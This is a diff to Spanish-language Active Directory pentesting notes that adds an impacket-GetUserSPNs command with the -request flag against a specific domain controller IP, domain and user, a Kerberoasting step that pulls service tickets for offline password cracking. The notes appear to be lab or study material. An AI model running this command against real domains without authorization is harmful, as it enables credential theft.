@@ -16,6 +16,7 @@
 
 ## Listar cuentas
 - `impacket-GetUserSPNs -dc-ip IP DOMAIN.LOCAL/USER`
+- `impacket-GetUserSPNs -request -dc-ip 172.16.139.3 -target-domain trilocor.local trilocor.local/pthorpe`
 - Ejemplo:
 ```powershell
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
